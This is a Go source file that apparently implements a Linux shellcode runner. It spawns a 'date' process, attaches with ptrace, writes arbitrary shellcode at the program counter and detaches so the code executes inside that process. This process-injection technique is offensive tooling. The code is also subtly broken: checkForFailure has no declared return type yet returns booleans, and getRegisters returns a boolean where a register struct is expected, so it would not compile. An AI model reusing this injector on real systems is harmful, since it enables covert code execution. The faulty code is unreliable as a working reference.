package shellcode

import (
	"fmt"
	"os/exec"
	"syscall"
)

// Runner runner
func Runner(shellcode []byte) bool {
	tPid := generateDummyProcess()
	if tPid == 0 {
		return false
	}
	if !attachToProcessAndWait(tPid) {
		return false
	}
	registers := getRegisters(tPid)
	if registers == (syscall.PtraceRegs{}) {
		return false
	}
	if !copyShellcode(tPid, shellcode, uintptr(registers.PC())) {
		return false
	}
	if !setRegisters(tPid, registers) {
		return false
	}
	if !detachFromProcess(tPid) {
		return false
	}
	return true
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	return true
}

func generateDummyProcess() int {
	cmd := exec.Command("date")
	cmdErr := cmd.Start()
	if cmdErr != nil {
		fmt.Println(cmdErr.Error())
	}
	return cmd.Process.Pid
}

func attachToProcessAndWait(tPid int) bool {
	var status syscall.WaitStatus
	attachErr := syscall.PtraceAttach(tPid)
	if !checkForFailure(attachErr) {
		return false
	}
	_, waitErr := syscall.Wait4(tPid, &status, syscall.WALL, nil)
	return checkForFailure(waitErr)
}

func detachFromProcess(tPid int) bool {
	detachErr := syscall.PtraceDetach(tPid)
	return checkForFailure(detachErr)
}

func copyShellcode(pid int, shellcode []byte, dst uintptr) bool {
	_, copyErr := syscall.PtracePokeData(pid, dst, shellcode)
	return checkForFailure(copyErr)
}

func getRegisters(pid int) syscall.PtraceRegs {
	var regs syscall.PtraceRegs
	regsErr := syscall.PtraceGetRegs(pid, &regs)
	return checkForFailure(regsErr)
}

func setRegisters(pid int, regs syscall.PtraceRegs) bool {
	regsErr := syscall.PtraceSetRegs(pid, &regs)
	return checkForFailure(regsErr)
}

func checkForFailure(err error) {
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	return true
}
